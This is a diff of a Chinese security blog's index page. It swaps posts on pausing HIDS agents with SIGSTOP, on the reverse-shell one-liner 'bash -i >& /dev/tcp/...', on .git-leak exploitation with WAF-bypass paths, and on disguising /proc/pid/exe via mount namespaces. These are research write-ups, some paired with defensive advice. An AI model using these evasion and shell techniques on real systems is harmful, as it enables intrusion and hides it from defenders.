@@ -125,7 +125,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">45</span>
+          <span class="site-state-item-count">44</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -159,114 +159,6 @@
 
 
     <div class="main-inner index posts-expand">
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE-%E6%94%BB%E9%98%B2%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%AE%9E%E8%B7%B5%EF%BC%88%E4%BA%8C%EF%BC%89/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="leveryd">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="leveryd的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE-%E6%94%BB%E9%98%B2%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%AE%9E%E8%B7%B5%EF%BC%88%E4%BA%8C%EF%BC%89/" class="post-title-link" itemprop="url">安全建设-攻防思路及实践（二）</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>有一个挖src的老套路：”.git目录”信息泄漏 + 人工代码审计。</p>
-<p>当网站可以访问”.git/index”时，可以用<a target="_blank" rel="noopener" href="http://www.lijiejie.com/githack-a-git-disclosure-exploit/">GitHack — 一个git泄露利用脚本</a>工具还原整个项目工程。然后对源码做代码审计，尝试挖掘漏洞。</p>
-<p>实际的案例可以见 <a target="_blank" rel="noopener" href="https://github.com/fun1355/Papers-1/blob/master/PVE-2015080201.md">百姓某处信息泄露可GET SHELL</a></p>
-<p>个人体会：对于企业内部业务的源码做代码审计来挖掘漏洞，难度比挖”成熟的框架、组件”容易太多了，都不需要攻击者掌握多少代码审计中的偏门技巧等。比如源码中非常可能就有api认证用的token，拿着token就能像也业务方一样调用api。</p>
-<h1 id="详细过程"><a href="#详细过程" class="headerlink" title="详细过程"></a>详细过程</h1><ul>
-<li><p>为啥会出现”.git目录信息泄漏”？</p>
-<p>根据个人有限的经验来看，很多公司都会建设devops平台，开发只需要在平台上提交上线单，就可以自动地拉取代码、编译构建、保存版本、发布部署。</p>
-<p>在”拉取代码”这一环节，devops平台从内部git平台上获取源码，其中就包括”.git目录”。</p>
-<p>在php、python等非编译语言的项目构建过程中，非常有可能就是简单地将整个项目全部拷贝到”产出目录”中，此时”.git目录”也会跟着被拷贝过去。</p>
-<p>等到了”发布部署”环节，”.git目录”自然就会出现在线上了。</p>
-</li>
-<li><p>利用”.git目录信息泄漏”还原”项目工程”时遇到的问题</p>
-<p>偶尔会遇到的一个问题是：不一定能访问”.git/index”就一定能用工具还原出整个项目。</p>
-<p>这个原因之前没有深究过，有可能是”.git/objects”目录下的文件无法访问。</p>
-<p>遇到这种情况时，还可以：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* .git&#x2F;index中包含了所有的文件名，可以直接访问文件名对应的url。比如暴露出的js文件，可以直接下载后找api信息。</span><br><span class="line">* .git&#x2F;config中包含了配置信息</span><br><span class="line">* 尝试手动下载 .git&#x2F;objects 目录下的 &quot;项目工程&quot;文件</span><br></pre></td></tr></table></figure>
-
-<p>另外更常见的问题是会遇到防火墙。这个时候可以试试 <code>.git/./index</code> 、 <code>.git///index</code> 、<code>/?/../.git/index</code>、<code>/%3f/../.git/index</code> 等</p>
-</li>
-</ul>
-<h1 id="成果"><a href="#成果" class="headerlink" title="成果"></a>成果</h1><p>漏洞（包括类似”git目录”等信息泄漏）均已提交并修复，包括并不限于：</p>
-<ul>
-<li>[评级严重-360游戏]</li>
-<li>两个 [评级低危-腾讯]</li>
-<li>两个 [评级中危-腾讯]</li>
-</ul>
-<p>2021年了，感觉 “.git目录”这种信息泄漏少见了很多。</p>
-<h1 id="安全建设"><a href="#安全建设" class="headerlink" title="安全建设"></a>安全建设</h1><p>对于”.git等文件信息泄漏”和”代码安全”，这两类风险，在企业安全建设中是怎么防范的呢？</p>
-<ul>
-<li><p>怎么减少”.git等文件信息泄漏”安全风险？</p>
-<p>其实不仅仅是 “.git/index”，还包括”.svn/entries”、”网站源码.tar.gz” 等文件都有可能暴露在公网给人下载，继而泄漏项目源码。</p>
-<p>根据个人有限的经验来总结，有以下方式减少风险：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">* 在devops平台做检查，比如&quot;发布部署&quot;前，检查当前产出目录下是否有敏感文件</span><br><span class="line">* 在waf中添加规则，来防护&quot;敏感文件泄漏&quot;</span><br><span class="line">* 周期性扫描</span><br><span class="line">* 依赖开发的安全意识，在&quot;编译构建&quot;时将&quot;.git目录&quot;等敏感文件删除</span><br></pre></td></tr></table></figure>
-
-<p>感觉资产覆盖到位，确实能消灭这种风险。</p>
-</li>
-<li><p>怎么减少”代码安全”安全风险？</p>
-<p>根据个人有限的经验来总结，有以下方式减少风险：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">* 建设白盒扫描，嵌入到devpops流程中</span><br><span class="line">* 安全部门提供安全sdk、安全编码规范</span><br><span class="line">* 其他不限于&quot;代码安全&quot;的应用安全产品，包括 rasp、黑盒扫描</span><br><span class="line">* 依赖开发的安全意识和安全编码水平</span><br><span class="line">* fuzz平台，类似[oss-fuzz](https:&#x2F;&#x2F;github.com&#x2F;google&#x2F;oss-fuzz)</span><br></pre></td></tr></table></figure>
-
-<p>个人感觉，由于 技术难度、有些场景安全技术无法解决、运营上要求非常低的误报 等原因，即使手段这么多，但是风险太难完全消除了。</p>
-</li>
-</ul>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>“.git”目录信息泄漏 + 人工代码审计 这个套路 现在感觉行不太通。</p>
-<p>另外有一个小问题：有师傅知道企业安全建设中怎么用威胁情报来拉黑ip的话，请公众号留言告诉我。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
 
     
 
@@ -441,7 +333,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%A6%82%E4%BD%95%E7%BB%93%E6%9D%9F%E5%92%8C%E6%9A%82%E5%81%9Cagent%E8%BF%9B%E7%A8%8B/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE-%E6%94%BB%E9%98%B2%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%AE%9E%E8%B7%B5%EF%BC%88%E4%BA%8C%EF%BC%89/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -454,7 +346,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-%E5%A6%82%E4%BD%95%E7%BB%93%E6%9D%9F%E5%92%8C%E6%9A%82%E5%81%9Cagent%E8%BF%9B%E7%A8%8B/" class="post-title-link" itemprop="url">如何结束和暂停agent进程</a>
+          <a href="/2021-12-26-%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE-%E6%94%BB%E9%98%B2%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%AE%9E%E8%B7%B5%EF%BC%88%E4%BA%8C%EF%BC%89/" class="post-title-link" itemprop="url">安全建设-攻防思路及实践（二）</a>
         </h2>
 
         <div class="post-meta-container">
@@ -478,86 +370,51 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>就像 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/WQeOfZtyKndbDebe66-V_g">如何避免文件上报-制作大文件</a> 说的，hids agent会上报很多信息，安全防护策略也是围绕”agent上报的信息”制定的。</p>
-<p>那如果攻击者”结束、暂停agent进程”，导致agent功能废掉，是不是就能够绕过hids的防护呢？</p>
-<p>研究过程中，我发现并不能轻易地结束agent进程；”结束和暂停agent进程”会带来”心跳失联”的异常特征，可能引起”运营人员”的注意从而导致攻击行为暴露。</p>
-<p>本文主要讨论以下问题：</p>
-<ul>
-<li>怎么结束agent进程？</li>
-<li>怎么暂停agent进程？</li>
-<li>“心跳失联”</li>
-</ul>
-<h1 id="结束agent进程"><a href="#结束agent进程" class="headerlink" title="结束agent进程"></a>结束agent进程</h1><ul>
-<li><p>怎么结束agent进程？</p>
-<p>在linux上执行 <code>kill -SIGKILL 进程号</code> 是一定可以结束进程的，因为 SIGKILL信号不能被忽略或者做其他处理。</p>
-<p>但是我们杀掉hids agent进程后，agent进程会自动重启。</p>
+          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>有一个挖src的老套路：”.git目录”信息泄漏 + 人工代码审计。</p>
+<p>当网站可以访问”.git/index”时，可以用<a target="_blank" rel="noopener" href="http://www.lijiejie.com/githack-a-git-disclosure-exploit/">GitHack — 一个git泄露利用脚本</a>工具还原整个项目工程。然后对源码做代码审计，尝试挖掘漏洞。</p>
+<p>实际的案例可以见 <a target="_blank" rel="noopener" href="https://github.com/fun1355/Papers-1/blob/master/PVE-2015080201.md">百姓某处信息泄露可GET SHELL</a></p>
+<p>个人体会：对于企业内部业务的源码做代码审计来挖掘漏洞，难度比挖”成熟的框架、组件”容易太多了，都不需要攻击者掌握多少代码审计中的偏门技巧等。比如源码中非常可能就有api认证用的token，拿着token就能像也业务方一样调用api。</p>
+<h1 id="详细过程"><a href="#详细过程" class="headerlink" title="详细过程"></a>详细过程</h1><ul>
+<li><p>为啥会出现”.git目录信息泄漏”？</p>
+<p>根据个人有限的经验来看，很多公司都会建设devops平台，开发只需要在平台上提交上线单，就可以自动地拉取代码、编译构建、保存版本、发布部署。</p>
+<p>在”拉取代码”这一环节，devops平台从内部git平台上获取源码，其中就包括”.git目录”。</p>
+<p>在php、python等非编译语言的项目构建过程中，非常有可能就是简单地将整个项目全部拷贝到”产出目录”中，此时”.git目录”也会跟着被拷贝过去。</p>
+<p>等到了”发布部署”环节，”.git目录”自然就会出现在线上了。</p>
 </li>
-<li><p>怎么实现”挂掉自动重启”？</p>
-<p>经过调研，”挂掉自动重启”机制在linux最常见的实现方式包括：</p>
-<blockquote>
-<p>通过 systemd、supervisord 等实现</p>
-<p>crond：通过计划任务</p>
-<p>watchdog</p>
-</blockquote>
-<p><a target="_blank" rel="noopener" href="https://github.com/bytedance/Elkeid/blob/main/server/docs/quick-start-zh_CN.md">字节hids文档</a> 推荐的也是”systemd”和”crond”这两种方式。</p>
-<p><img src="https://images.gitee.com/uploads/images/2021/0923/234007_74229bc1_83508.png" alt="字节hids文档" title="屏幕截图.png"></p>
-<p>有对supervisord、systemd实现原理感兴趣的，可以看最后一节。</p>
-</li>
-<li><p>怎么结束被systemd、supervisord管理的进程？</p>
-<p>supervisord和systemd等管理的进程可以通过”supervisorctl”和”systemctl”等命令关掉。</p>
-<p>这两命令实际也是通过”本地socket通信”告诉supervisord和systemd结束进程，所以当没有办法使用”supervisorctl”和”systemctl”命令时，也可以编写程序直接和”本地socket文件”通信。</p>
-</li>
-</ul>
-<h1 id="暂停agent进程"><a href="#暂停agent进程" class="headerlink" title="暂停agent进程"></a>暂停agent进程</h1><ul>
-<li><p>怎么暂停agent进程？</p>
-<p>向进程发送SIGSTOP、SIGTSTP、SIGTTIN等信号都可能暂停进程，推荐用SIGSTOP信号，原因是进程收到其他信号还能忽略，收到SIGSTOP信号却只能暂停进程。</p>
-<p>这个结论可以在<code>man 7 signal</code>看到</p>
-<blockquote>
-<p>The signals SIGKILL and SIGSTOP cannot be caught, blocked, or ignored.</p>
-</blockquote>
-</li>
-</ul>
-<ul>
-<li><p>“暂停的agent进程”是否会被自动重启或者恢复运行状态？</p>
-<p>这里还存在一个小问题：当子进程被暂停或者结束时，父进程是可以收到SIGCHLD信号的。那systemd遇到子进程暂停时，会不会重启进程？</p>
-<p>经过测试和源码对比，我的结论是：systemd不会。</p>
-</li>
-<li><p>测试某hids</p>
-<p>经过对某hids做测试，发现stop状态的agent进程会被恢复成运行状态。</p>
-<p>agent进程的父进程的父进程才是systemd，所以估计是agent父进程收到SIGCHLD信号后向agent进程发送了SIGCONT信号恢复运行状态。</p>
-<p>当把hids所有的agent进程都暂停后，符合预期：所有agent进程一直被暂停。</p>
-</li>
-</ul>
-<h1 id="“心跳失联”的问题"><a href="#“心跳失联”的问题" class="headerlink" title="“心跳失联”的问题"></a>“心跳失联”的问题</h1><ul>
-<li><p>“心跳失联”是什么？</p>
-<p>正常情况下，agent按照一定频率会发送”心跳包”告诉server自己存活。</p>
-<p>如果”结束和暂停agent进程”，就会影响到”心跳包”的发送。进而server端是可以感知到agent异常的。</p>
-<p>这种异常可能引起”运营人员”的注意从而导致攻击行为暴露。</p>
-</li>
-<li><p>怎么解决”心跳失联”的问题？</p>
-<p>凭空想象的一种解决方法：恶意样本 先暂停agent进程，等到恶意行为完成后，再恢复agent进程。</p>
-<p>这样心跳也存在，也有可能绕过hids防护。</p>
-</li>
-</ul>
-<h1 id="systemd是怎么知道”进程挂掉”？"><a href="#systemd是怎么知道”进程挂掉”？" class="headerlink" title="systemd是怎么知道”进程挂掉”？"></a>systemd是怎么知道”进程挂掉”？</h1><p>先说我验证的结论：</p>
-<ul>
-<li>systemd为sigchild信号注册了一个处理函数，函数内部调用waitid处理退出的子进程。</li>
-<li>当systemd管理的进程退出时，systemd进程会收到sigchild信号，进而跳转到处理函数。</li>
-</ul>
-<p>从<a target="_blank" rel="noopener" href="https://github.com/systemd/systemd/blob/71a80dcc0b64b01c73e7141c4292ef301543a011/src/core/manager.c">systemd源码</a>可以看到manager_setup_sigchld_event_source函数就是”sigchild信号的处理函数”。<br><img src="https://images.gitee.com/uploads/images/2021/0923/234046_4aa2c450_83508.png" alt="输入图片说明" title="屏幕截图.png"></p>
-<p>如果systemd进程号为1，也可以通过<code>strace -p 1</code>来验证结论：</p>
-<p>结束systemd管理的进程时（下面例子中是83206号进程），可以看到waitid系统调用</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">waitid(P_ALL, 0, &#123;si_signo&#x3D;SIGCHLD, si_code&#x3D;CLD_KILLED, si_pid&#x3D;83206, si_uid&#x3D;0, si_status&#x3D;SIGKILL, si_utime&#x3D;0, si_stime&#x3D;0&#125;, WNOHANG|WEXITED|WNOWAIT, NULL) &#x3D; 0</span><br><span class="line">...</span><br><span class="line">waitid(P_PID, 83206, &#123;si_signo&#x3D;SIGCHLD, si_code&#x3D;CLD_KILLED, si_pid&#x3D;83206, si_uid&#x3D;0, si_status&#x3D;SIGKILL, si_utime&#x3D;0, si_stime&#x3D;0&#125;, WEXITED, NULL) &#x3D; 0</span><br><span class="line">waitid(P_ALL, 0, &#123;&#125;, WNOHANG|WEXITED|WNOWAIT, NULL) &#x3D; 0</span><br></pre></td></tr></table></figure>
+<li><p>利用”.git目录信息泄漏”还原”项目工程”时遇到的问题</p>
+<p>偶尔会遇到的一个问题是：不一定能访问”.git/index”就一定能用工具还原出整个项目。</p>
+<p>这个原因之前没有深究过，有可能是”.git/objects”目录下的文件无法访问。</p>
+<p>遇到这种情况时，还可以：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* .git&#x2F;index中包含了所有的文件名，可以直接访问文件名对应的url。比如暴露出的js文件，可以直接下载后找api信息。</span><br><span class="line">* .git&#x2F;config中包含了配置信息</span><br><span class="line">* 尝试手动下载 .git&#x2F;objects 目录下的 &quot;项目工程&quot;文件</span><br></pre></td></tr></table></figure>
 
-<p>supervisord和systemd有点类似，不一样的是supervisord似乎只用wait等系统调用，来判断子进程是否已经退出。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# ps aux|grep supervi</span><br><span class="line">root     13170  0.0  0.0  56368 12760 ?        Ss   6月01  71:47 &#x2F;usr&#x2F;bin&#x2F;python &#x2F;usr&#x2F;bin&#x2F;supervisord -c &#x2F;data&#x2F;poc-web-api&#x2F;docker&#x2F;supervisor.conf</span><br><span class="line">[root@instance-fj5pftdp ~]# strace -p 13170 2&gt;&amp;1 | grep -i wait</span><br><span class="line">...</span><br><span class="line">wait4(-1, 0x7fffbe389d9c, WNOHANG, NULL) &#x3D; 0</span><br><span class="line">wait4(-1, 0x7fffbe389d9c, WNOHANG, NULL) &#x3D; 0</span><br><span class="line">wait4(-1, 0x7fffbe389d9c, WNOHANG, NULL) &#x3D; 0</span><br><span class="line">wait4(-1, [&#123;WIFSIGNALED(s) &amp;&amp; WTERMSIG(s) &#x3D;&#x3D; SIGKILL&#125;], WNOHANG, NULL) &#x3D; 5557</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
-<li>“结束进程”需要考虑到”进程挂掉重启”的场景</li>
-<li>“暂停进程”需要考虑到”父进程恢复进程状态”的场景</li>
+<p>另外更常见的问题是会遇到防火墙。这个时候可以试试 <code>.git/./index</code> 、 <code>.git///index</code> 、<code>/?/../.git/index</code>、<code>/%3f/../.git/index</code> 等</p>
+</li>
 </ul>
-<p>本文提到的手段没有在真实的对抗中实践过，仅仅是我自己的研究，欢迎与我交流。</p>
+<h1 id="成果"><a href="#成果" class="headerlink" title="成果"></a>成果</h1><p>漏洞（包括类似”git目录”等信息泄漏）均已提交并修复，包括并不限于：</p>
+<ul>
+<li>[评级严重-360游戏]</li>
+<li>两个 [评级低危-腾讯]</li>
+<li>两个 [评级中危-腾讯]</li>
+</ul>
+<p>2021年了，感觉 “.git目录”这种信息泄漏少见了很多。</p>
+<h1 id="安全建设"><a href="#安全建设" class="headerlink" title="安全建设"></a>安全建设</h1><p>对于”.git等文件信息泄漏”和”代码安全”，这两类风险，在企业安全建设中是怎么防范的呢？</p>
+<ul>
+<li><p>怎么减少”.git等文件信息泄漏”安全风险？</p>
+<p>其实不仅仅是 “.git/index”，还包括”.svn/entries”、”网站源码.tar.gz” 等文件都有可能暴露在公网给人下载，继而泄漏项目源码。</p>
+<p>根据个人有限的经验来总结，有以下方式减少风险：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">* 在devops平台做检查，比如&quot;发布部署&quot;前，检查当前产出目录下是否有敏感文件</span><br><span class="line">* 在waf中添加规则，来防护&quot;敏感文件泄漏&quot;</span><br><span class="line">* 周期性扫描</span><br><span class="line">* 依赖开发的安全意识，在&quot;编译构建&quot;时将&quot;.git目录&quot;等敏感文件删除</span><br></pre></td></tr></table></figure>
+
+<p>感觉资产覆盖到位，确实能消灭这种风险。</p>
+</li>
+<li><p>怎么减少”代码安全”安全风险？</p>
+<p>根据个人有限的经验来总结，有以下方式减少风险：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">* 建设白盒扫描，嵌入到devpops流程中</span><br><span class="line">* 安全部门提供安全sdk、安全编码规范</span><br><span class="line">* 其他不限于&quot;代码安全&quot;的应用安全产品，包括 rasp、黑盒扫描</span><br><span class="line">* 依赖开发的安全意识和安全编码水平</span><br><span class="line">* fuzz平台，类似[oss-fuzz](https:&#x2F;&#x2F;github.com&#x2F;google&#x2F;oss-fuzz)</span><br></pre></td></tr></table></figure>
+
+<p>个人感觉，由于 技术难度、有些场景安全技术无法解决、运营上要求非常低的误报 等原因，即使手段这么多，但是风险太难完全消除了。</p>
+</li>
+</ul>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>“.git”目录信息泄漏 + 人工代码审计 这个套路 现在感觉行不太通。</p>
+<p>另外有一个小问题：有师傅知道企业安全建设中怎么用威胁情报来拉黑ip的话，请公众号留言告诉我。</p>
 
       
     </div>
@@ -816,7 +673,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%88%86%E6%9E%90bash%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E8%AF%AD%E6%B3%95/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%A6%82%E4%BD%95%E4%BC%AA%E8%A3%85%E8%BF%9B%E7%A8%8B%E4%BF%A1%E6%81%AF/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -829,7 +686,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-%E5%88%86%E6%9E%90bash%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E8%AF%AD%E6%B3%95/" class="post-title-link" itemprop="url">分析bash反弹shell的语法</a>
+          <a href="/2021-12-26-%E5%A6%82%E4%BD%95%E4%BC%AA%E8%A3%85%E8%BF%9B%E7%A8%8B%E4%BF%A1%E6%81%AF/" class="post-title-link" itemprop="url">如何伪装进程信息</a>
         </h2>
 
         <div class="post-meta-container">
@@ -853,63 +710,84 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>对下面的反弹shell语法细节有些模糊，故分析一下。</p>
-<p>bash -i &gt;&amp; /dev/tcp/127.0.0.1/2222 0&gt;&amp;1</p>
-<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><ul>
-<li><p>-i 参数</p>
-<p>  生成交互式shell</p>
-</li>
-<li><p><code>&gt;&amp;</code> 是什么？</p>
-<p>  bash中<code>&gt;&amp;</code>语法比较特殊，有两种解释：</p>
+          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>在<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/hWd0EOaBgVbgTBjsdg7QfA">如何改变进程名称</a> 中提到了一些隐藏进程信息的方式，当时遗留有一个问题：不论哪种方式，exe文件仍然有原程序相关信息。</p>
+<p>本文将总结两种”隐藏/proc/{pid}/exe文件”的方式，并浅析两种方式的隐藏效果。</p>
+<p>两种方式包括：</p>
 <ul>
-<li><p>后面接数字时，如<code>&gt;&amp;1</code>表示复制文件描述符</p>
+<li>mount命名空间</li>
+<li>修改软链接内容</li>
+</ul>
+<h1 id="mount命名空间"><a href="#mount命名空间" class="headerlink" title="mount命名空间"></a>mount命名空间</h1><ul>
+<li><p>现象</p>
+<p>思路来源于<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/CSrodJeMFmGNMHyp1PCTSQ">基于Linux Namespaces 特性实现的消音</a></p>
+<p>先来看一个现象：<code>/proc/31867/exe</code>指向的可执行文件内容是一串文本。</p>
+<p><img src="https://images.gitee.com/uploads/images/2021/1002/235514_50f14956_83508.png" alt="图一" title="屏幕截图.png"></p>
+<p>难道文本内容可以被当做二进制文件执行吗？</p>
+<p>答案当然是不行的。这里只是执行/tmp/sleep命令的方式比较特殊，如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# echo 111 &gt; &#x2F;tmp&#x2F;sleep</span><br><span class="line">[root@instance-fj5pftdp ~]# unshare -m bash -c &quot;mount -t tmpfs xx &#x2F;tmp&#x2F;;cp &#x2F;usr&#x2F;bin&#x2F;sleep &#x2F;tmp&#x2F;sleep;&#x2F;tmp&#x2F;sleep 1000&quot; &amp;</span><br><span class="line">[1] 31865</span><br><span class="line">[root@instance-fj5pftdp ~]# ps aux|grep sleep</span><br><span class="line">root      31867  0.0  0.0 108052   612 pts&#x2F;74   S    10:01   0:00 &#x2F;tmp&#x2F;sleep 1000</span><br></pre></td></tr></table></figure>
+
+<p><code>unshare -m</code>命令创建了一个新的”mount命名空间”，然后在这个空间中挂载了tmpfs文件系统，最后执行sleep程序。</p>
 </li>
-<li><p>后面接非数字时，如<code>&gt;&amp;xxx</code>表示标准输入和标准输出重定向</p>
-<p>可以查看<code>man bash</code>手册，有详细介绍。</p>
-<p>在这个反弹shell中，第一个<code>&gt;&amp;</code>含义是 把标准输入和标准输出重定向到socket</p>
+<li><p>“mount命名空间”是什么？</p>
+<p>“命名空间”是容器的核心原理之一。从效果上来看，”mount命名空间”可以让宿主机和容器中的”挂载信息”隔离。</p>
+<p>比如在上面例子中，宿主机上执行<code>mount</code>命令是是看不到”tmpfs文件系统被挂载在/tmp”目录下的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# mount | grep xx</span><br><span class="line">[root@instance-fj5pftdp ~]#</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>这种方式的对抗效果怎么样？</p>
+<p>可以从两个场景来评估”对抗效果”：</p>
+<blockquote>
+<p>1.和”应急分析人员”对抗：应急人员是否能够轻易发现异常？</p>
+<p>2.和”安全产品”对抗：安全产品是否能够轻易发现异常？安全产品的上报策略是否受此种方式影响？</p>
+</blockquote>
+<p>从”应急场景”的角度来看，应急分析人员如果很清楚<code>/proc/&#123;PID&#125;/exe</code>指向的文件不可信，可以通过 对比”可疑进程”和1号进程，验证mnt命名空间不同</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# ll &#x2F;proc&#x2F;31867&#x2F;ns&#x2F;mnt</span><br><span class="line">lrwxrwxrwx 1 root root 0 10月  1 23:42 &#x2F;proc&#x2F;31867&#x2F;ns&#x2F;mnt -&gt; mnt:[4026533456]</span><br><span class="line">[root@instance-fj5pftdp ~]# ll &#x2F;proc&#x2F;1&#x2F;ns&#x2F;mnt</span><br><span class="line">lrwxrwxrwx 1 root root 0 10月  1 23:43 &#x2F;proc&#x2F;1&#x2F;ns&#x2F;mnt -&gt; mnt:[4026531840]  &#x2F;&#x2F; 和 4026533456 不同</span><br></pre></td></tr></table></figure>
+
+<p>然后通过nsenter命令获取特定进程的挂载信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# nsenter -m -t 31867 mount|grep &#x2F;tmp</span><br><span class="line">xx on &#x2F;tmp type tmpfs (rw,relatime)</span><br></pre></td></tr></table></figure>
+
+<p>从”安全产品对抗”的角度来看，可以有以下结论：</p>
+<blockquote>
+<p>1.hids可以监控mount系统调用来发现异常；不过不是所有的agent都会监控mount系统调用，比如<a target="_blank" rel="noopener" href="https://github.com/bytedance/Elkeid/tree/main/driver">字节hids</a>就没有。</p>
+<p>2.hids上报文件时，如果是读取软链接指向的文件（比如案例中的/tmp/sleep，而不是/proc/31867/exe），就有可能上报错误的文件。</p>
+</blockquote>
 </li>
 </ul>
+<h1 id="修改软链接内容"><a href="#修改软链接内容" class="headerlink" title="修改软链接内容"></a>修改软链接内容</h1><ul>
+<li><p>怎么修改软链接内容？</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10235">Linux进程伪装：动态修改/proc/self/exe</a> 文章中总结了两种方法：</p>
+<blockquote>
+<p>1.execve函数</p>
+<p>2.prctl系统调用</p>
+</blockquote>
+<p>读者可直接阅读原文，这里我只记录一个自己看文章时的疑问：如果先创建线程A然后再调用execve，是否线程A还能继续执行？</p>
+<p>答案是不行。</p>
+<p>man 2 execve手册有说明：所有线程都被销毁</p>
